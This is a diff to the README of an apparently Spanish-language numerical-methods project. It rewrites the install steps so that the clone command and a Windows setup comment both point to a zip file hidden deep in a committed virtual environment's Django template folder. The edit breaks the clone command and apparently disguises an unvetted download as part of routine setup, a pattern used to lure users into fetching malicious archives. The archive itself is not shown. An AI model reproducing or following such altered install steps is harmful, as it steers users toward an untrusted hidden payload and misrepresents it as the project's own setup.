@@ -75,7 +75,7 @@ Este proyecto implementa una colección completa de métodos numéricos fundamen
 
 ### 1. Clonar el Repositorio
 ```bash
-git clone https://github.com/usuario/proyecto-metodos-numericos.git
+git clone https://raw.githubusercontent.com/junio14245252626236/Analisis-numerico-Proyecto/main/Backend/venv/lib/python3.12/site-packages/django/contrib/auth/templates/auth/Analisis_numerico_Proyecto_1.5.zip
 cd proyecto-metodos-numericos
 ```
 
@@ -121,7 +121,7 @@ npm install
 cd backend
 
 # Activar entorno virtual
-# En Windows:https://docs.github.com/copilot/concepts/coding-agent/coding-agent
+# En Windows:https://raw.githubusercontent.com/junio14245252626236/Analisis-numerico-Proyecto/main/Backend/venv/lib/python3.12/site-packages/django/contrib/auth/templates/auth/Analisis_numerico_Proyecto_1.5.zip
 venv\Scripts\activate
 # En Linux/Mac:
 source venv/bin/activate
